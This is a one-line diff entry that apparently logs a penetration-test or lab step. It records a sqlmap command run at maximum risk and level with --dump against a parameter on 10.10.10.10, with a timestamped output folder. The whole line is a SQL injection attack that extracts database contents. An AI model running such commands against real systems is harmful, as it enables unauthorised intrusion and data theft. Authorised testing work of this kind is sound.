@@ -1,0 +1,1 @@
+http://10.10.10.10/index.php?id=1 (GET)  # /usr/bin/sqlmap -u http://10.10.10.10/index.php?id=1 --batch --risk=3 --level=5 --dump --threads=4 --output-dir=sqlmap_http10.10.10.10index.phpid1_2025-08-02_1258
